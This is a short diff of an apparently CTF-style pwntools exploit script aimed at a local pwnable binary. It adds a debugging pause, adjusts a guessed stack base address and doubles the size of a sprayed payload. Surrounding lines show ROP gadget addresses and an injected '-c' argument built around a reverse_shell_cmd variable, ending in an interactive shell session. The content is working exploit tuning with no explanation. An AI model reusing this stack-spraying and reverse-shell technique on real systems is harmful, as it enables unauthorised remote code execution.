@@ -13,6 +13,8 @@ pwnable = ELF(pwnable_filename)
 Io = remote("127.0.0.1", 4444)
 # Io = process(pwnable_filename)
 
+raw_input(">>>")
+
 
 output_addr = 0x080480F9
 input_addr = 0x080480E1
@@ -20,6 +22,7 @@ start_addr = 0x080480B8
 base_addr = 0x08048000
 
 stack_start_addr = 0xff900000
+stack_start_addr = 0xff8bb000
 stack_size = 0x14d000
 
 add_esp_20_ret_addr = 0x0804817C
@@ -178,7 +181,7 @@ inject(
         "-c\x00\x00\x00\x00\x00\x00" +
         reverse_shell_cmd
     ).ljust(len(single_payload * 2), "\x00") +
-    single_payload * (0x20000)
+    single_payload * (0x40000)
 )
 
 Io.interactive()
